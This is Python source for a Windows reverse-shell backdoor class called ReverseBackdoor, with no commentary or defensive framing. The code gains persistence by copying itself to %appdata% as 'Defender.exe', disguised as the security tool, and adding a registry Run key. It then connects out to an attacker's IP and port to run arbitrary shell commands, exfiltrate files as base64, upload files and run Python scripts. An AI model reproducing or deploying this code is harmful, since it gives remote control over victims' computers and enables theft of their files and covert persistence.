import shutil
import socket, pickle, os, base64,sys
import subprocess,time

from subprocess import *

class ReverseBackdoor:

    def __init__(self,ip,port):
        self.activate_at_startup()
        self.ip = ip
        self.port = port
    def activate_at_startup(self):
        file_location = os.environ["appdata"] + "\\Defender.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable,file_location)
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Defender /t REG_SZ /d "{file_location}"',shell=True)
    def change_directory(self,dir_path):
        try:
            os.chdir(dir_path)
            out = "[+]CHANGING CURRENT WORKING DIRECTORY TO "+dir_path
        except WindowsError:
            out = "[-]INVALID PATH"
        return self.send(out)

    def read_file(self,path):
        with open(path,"rb") as file:
            return self.send(base64.b64encode(file.read()))

    def write_file(self,path,content):
        with open(path,'wb') as file:
            file.write(base64.b64decode(content))
            file.close()
            return self.send("[+] UPLOAD SUCCESSFUL")


    def receive(self,connection):
        data = "".encode()
        while True:
            try:
                data += connection.recv(1024)
                command = pickle.loads(data)
                return command
            except pickle.UnpicklingError:
                continue

    def send(self,data):
        try:
            data = data.encode()
        except:
            data = data
        output = pickle.dumps(data)
        return output

    def execute(self,commands):
        try:
            out = check_output(commands,shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except CalledProcessError:
            out = "[-] INVALID COMMAND".encode()

        return self.send(out)

    def exit(self,connection):
        connection.close()
        sys.exit()

    def post_connection(self,connection):

        try:
            while True:
                commands = self.receive(connection)  # 1024 byte
                output =""

                if commands[0] == "exit":
                    self.exit(connection)
                elif commands[0] == "python":
                    if len(commands) == 2:
                        os.system("python "+commands[1])
                        output = self.send("[+] Successful")
                    else:
                        output = self.send("[-] Invalid command")
                elif commands[0] == "cd":
                        try:
                            output = self.change_directory(commands[1])
                        except IndexError:
                            output = self.execute("cd")

                elif commands[0] == "download":
                    try:
                        output = self.read_file(commands[1])
                    except:
                        print("hi")
                        output = self.send("[-]INVALID FILE..")

                elif commands[0] == "upload":
                    try:
                        print("hi")
                        output = self.write_file(commands[1],commands[2])
                    except:
                        output = self.send("[-]INVALID FILE..")
                else:
                    output = self.execute(commands[0])

                connection.send(output)
        except Exception as e:
            output = self.send("[-] "+str(e)+" error occurred")
            connection.send(output)
            self.post_connection(connection)
    def run(self):
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            '''
            https://www.tutorialspoint.com/python/python_networking.html
            '''
            connection.connect((self.ip,self.port))   #ip , port in tuple
            self.post_connection(connection)
            connection.close()
        except ConnectionRefusedError:
            self.run()

        except ConnectionAbortedError:
            sys.exit()